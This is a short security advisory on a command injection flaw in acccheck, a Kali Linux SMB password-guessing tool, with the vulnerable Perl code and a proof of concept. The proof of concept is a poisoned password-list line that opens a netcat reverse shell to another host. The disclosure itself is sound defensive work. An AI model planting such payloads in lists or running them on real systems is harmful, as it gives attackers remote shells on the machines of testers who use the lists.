# Never trust the password lists

## Summary

Penetration testers often download password lists from external sources to use them in their bruteforcing tools. A very quick audit of some bruteforcing tools provided with Kali Linux show that a few of them show vulnerabilities where using maliciously crafted password lists could be dangerous.

`acccheck` is one of these tool, which is vulnerable to command injection.

Penetration testers should always audit their username and password bruteforcing lists before using them.

## Description

From the source code: 

Attempts to connect to the IPC$ and ADMIN$ shares depending on which flags have been
chosen, and tries a combination of usernames and passwords in the hope to identify
the password to a given account via a dictionary password guessing attack.

The tools can be obtained at [https://labs.portcullis.co.uk/tools/acccheck/](https://labs.portcullis.co.uk/tools/acccheck/).


## Vulnerability

The tools is vulnerable to command injection due to a lack of sanitization of user input.

By feeding a specific user or password list, arbitrary code can be executed.

Example of vulnerable code:

```
foreach $singlePass (@PASS_LIST)                                          
      {                                                                         
        chomp($singlePass);                                                     
        output("Host:$singleIp, Username:Administrator, Password:'$singlePass'");
        $connectValue = system("smbclient \\\\\\\\$singleIp\\\\admin\$ -U Administrator%'$singlePass' -c 'exit' 1> /dev/null 2> /dev/null");
```

$singlePass and $singleIP are retreived from the username and password file.

## Proof of concept

```
root@kali:~# cat passwords.txt 
admin
test
';printf 'nc -e /bin/sh 192.168.1.254 80' > /tmp/pwned ; sh /tmp/pwned & #
```

```
root@kali:~# acccheck -t 192.168.1.1 -P passwords.txt
```

## Recommendations

1. Usernames and passwords provided per lists should be correctly escaped before inserted in the prepared statement.

2. Username and password lists from unknown sources should never be trusted and always be audited before use.
